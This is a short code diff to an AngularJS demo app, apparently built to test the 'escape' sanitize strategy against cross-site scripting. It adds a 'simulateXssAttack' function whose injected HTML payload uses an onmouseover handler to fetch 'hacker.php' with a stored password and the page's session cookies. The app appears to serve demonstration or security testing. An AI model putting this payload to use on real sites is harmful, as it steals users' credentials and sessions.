@@ -13,7 +13,9 @@ app.config([
 
     $translateProvider.useSanitizeValueStrategy('escape'); // works regardless
 
-    window.secretPassword = 'super-secret-password';
+    localStorage.setItem('password', 'super-secret-password');
+    document.cookie =
+      'cookieName=cookieValue; expires=Thu, 18 Dec 2024 12:00:00 UTC; path=/';
   },
 ]);
 
@@ -22,9 +24,9 @@ app.controller('Ctrl', [
   function ($scope) {
     $scope.input = '';
 
-    $scope.copyToClipboard = function () {
-      var str = `<div onmouseover="javascript:fetch('hacker.php?password=' + window.secretPassword);">MOUSE OVER ME!</div>`;
-      navigator.clipboard.writeText(str);
+    $scope.simulateXssAttack = function () {
+      var str = `<div onmouseover="javascript:fetch('hacker.php?password=' + localStorage.getItem('password') + '&session=' + encodeURIComponent(document.cookie));">MOUSE OVER ME!</div>`;
+      $scope.input = str;
     };
   },
 ]);
